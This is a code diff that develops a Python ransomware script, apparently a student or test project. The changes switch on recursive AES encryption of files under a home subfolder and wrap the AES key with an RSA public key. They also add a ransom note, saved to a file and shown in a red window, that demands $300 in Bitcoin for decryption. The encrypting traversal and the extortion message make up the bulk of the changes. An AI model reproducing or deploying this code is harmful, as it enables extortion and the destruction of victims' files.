@@ -1,11 +1,11 @@
-import Crypto, ast, os, sys, glob, socket, base64, hashlib, tkinter, webbrowser
+import Crypto, ast, os, sys, glob, socket, base64, hashlib, tkinter, webbrowser, time, random, io, base64
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
+from tkinter import *
 from Crypto import Random
 from os.path import expanduser
-from GenAsymKeys import GenAsymKeys
-import random
-import time
+from urllib2 import urlopen
+
 
 #significant help on getting AES encryption to work from
 #https://github.com/the-javapocalypse/Python-File-Encryptor/blob/master/script.py
@@ -42,7 +42,7 @@ def decrypt_file(key, file_name):
     os.remove(file_name)
 
 #traversing the file system to encrypt files
-def traverse_files(nwd, key, depth):
+def traverse_files(nwd, aes_key, depth):
     # get list of files and directories in current directory
     search_dir = nwd + "/*"
     files = glob.glob(search_dir)
@@ -51,53 +51,72 @@ def traverse_files(nwd, key, depth):
         for path in files:
             req1 = 'Home' in os.path.basename(os.path.normpath(path))
             req2 = 'home' in os.path.basename(os.path.normpath(path))
-            req3 = 'HOME' in os.path.basename(os.path.normpath(path))
+            req3 = 'INFO' in os.path.basename(os.path.normpath(path))
 
             if not os.path.isdir(path):
-                print((depth*'  ') + "|F: " + os.path.basename(os.path.normpath(path)))
-                encrypt_file(key, path)
-                #time.sleep(10)
-                #decrypt_file(key, path + ".enc")
+                encrypt_file(aes_key, path)
+                #print((depth*'  ') + "|F: " + os.path.basename(os.path.normpath(path)))
+
             elif os.path.isdir(path) and not req2 and not req2 and not req3:
-                print("|" + (depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
-                traverse_files(path, key, depth + 1)
+                traverse_files(path, aes_key, depth + 1)
+                #print("|" + (depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
         files = []
 
-def display_note():
-    top = tkinter.Tk()
-    # Code to add widgets will go here...
-    top.mainloop()
+def display_note(dir):
+
+    note = """ Q: What has happened to my computer
+
+    All of your files have been encrypted using AES encryption.
+
+
+Q: Can I recover my files?
+
+    Yes you can. Just send $300 of Bitcoin to this Bitcoin address:
+
+                  1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+    Bitcoins can be purchased from Coinbase at the URL:
+
+                  https://www.coinbase.com/buy-bitcoin
+
+    Then, send an email to the email address you received this file from and we
+    will send you the decryption program.
+    """
+
+    f = open (dir + "/RANSOMNOTE.txt", 'w')
+    f.write(note) #write ciphertext to file
+    f.close()
+
+    master = Tk()
+    master.title('RANSOMWARE ATTACK')
+    msg = Message(master, text = note)
+    msg.config(bg='red', font=('times', 24, 'italic'))
+    msg.pack()
+    mainloop()
+    display_note()
 
 def main():
-    #getting the public key that was generated for this target
-    f = open ("publicKey.txt", 'r')
-    rsa_key = RSA.importKey(f.read())
-    f.close()
+    #### PUBLIC ENCRYPTION KEY WILL BE ADDED HERE ####
+
+
+    rsa_key = RSA.importKey(public_key)
     pub_key = rsa_key.publickey()
 
     #generate a random AES key, pass it to the traverse function which will
     #use it for encrypting individual files
+    #represented in bytes 32 bytes = 256 bits
     aes_key = os.urandom(32)
 
     #start from the home directory, pass it to the traverse function
     home = expanduser('~')
     cwd = home + '/TestFiles'
     print(cwd + "\n")
-    #traverse_files(cwd, aes_key, 0)
-
-    home = expanduser('~')
-    cwd = home + '/Desktop'
-    print(cwd + "\n")
-    #traverse_files(cwd, aes_key, 0)
+    traverse_files(cwd, aes_key, 0)
 
     encrypted_key = pub_key.encrypt(aes_key, 32)
 
-    f = open ("privateKey.txt", 'r')
-    rsa_key = RSA.importKey(f.read())
-    f.close()
-
     home = expanduser('~')
-    info_dir = home + '/Desktop/READ'
+    info_dir = home + '/Desktop/INFO'
     if not os.path.exists(info_dir):
         os.makedirs(info_dir)
 
@@ -105,9 +124,7 @@ def main():
     f.write(str(encrypted_key)) #write ciphertext to file
     f.close()
 
-    webbrowser.open("https://www.coinbase.com/signup")
-
-    display_note()
+    display_note(info_dir)
 
 if __name__ == "__main__":
     main()
